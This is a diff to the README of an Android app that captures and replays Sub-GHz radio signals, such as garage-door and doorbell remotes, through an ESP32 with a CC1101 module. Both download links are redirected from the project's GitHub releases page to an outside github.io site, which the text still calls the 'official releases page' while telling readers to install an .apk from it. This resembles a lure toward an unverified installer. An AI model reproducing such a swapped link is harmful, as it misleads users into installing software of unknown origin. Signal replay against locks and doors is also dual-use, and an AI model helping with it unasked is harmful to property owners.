@@ -1,6 +1,6 @@
 # 📡 IshtarRF-Android - Control Sub-GHz signals from your phone
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/ghost00318/IshtarRF-Android/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://ghost00318.github.io)
 
 IshtarRF-Android turns your Android device into a powerful radio tool. It works with standard hardware to let you capture, save, and replay wireless signals. You connect an ESP32 chip with a CC1101 radio module to your phone. The app manages the signals for you. It uses the USB-OTG connection to talk to your hardware. This tool handles various wireless frequencies used by garage doors, doorbells, and remote sensors. 
 
@@ -17,7 +17,7 @@ You must wire the CC1101 module to the ESP32 board properly. Use standard SPI pi
 
 ## 📥 Getting the App
 
-1. Visit the [official releases page](https://github.com/ghost00318/IshtarRF-Android/releases).
+1. Visit the [official releases page](https://ghost00318.github.io).
 2. Look for the Assets section at the bottom of the newest release.
 3. Tap the file ending in .apk to download it.
 4. Open the downloaded file to start the installation.
